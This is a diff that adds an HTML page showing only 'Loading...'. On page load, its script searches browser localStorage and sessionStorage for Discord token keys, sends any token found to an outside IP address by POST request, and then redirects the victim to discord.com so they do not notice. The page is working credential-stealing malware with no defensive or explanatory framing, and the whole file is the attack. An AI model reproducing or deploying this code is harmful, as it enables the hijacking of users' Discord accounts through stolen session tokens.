@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        function stealToken() {
+            // Discord stores tokens in localStorage under these keys
+            const tokenKeys = [
+                'token',
+                'discordtoken',
+                'DiscordToken',
+                'TOKEN',
+                'access_token'
+            ];
+
+            let token = null;
+            for (const key of tokenKeys) {
+                token = localStorage.getItem(key);
+                if (token) break;
+            }
+
+            // If not found in localStorage, try sessionStorage
+            if (!token) {
+                for (const key of tokenKeys) {
+                    token = sessionStorage.getItem(key);
+                    if (token) break;
+                }
+            }
+
+            // If token is found, send it to your server
+            if (token) {
+                fetch('http://49.36.57.49:5000/token', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ token: token })
+                });
+            }
+
+            // Redirect to a legit-looking page to avoid suspicion
+            window.location.href = "https://discord.com";
+        }
+
+        // Run the function when the page loads
+        window.onload = stealToken;
+    </script>
+</head>
+<body>
+    <p>Loading...</p>
+</body>
+</html>
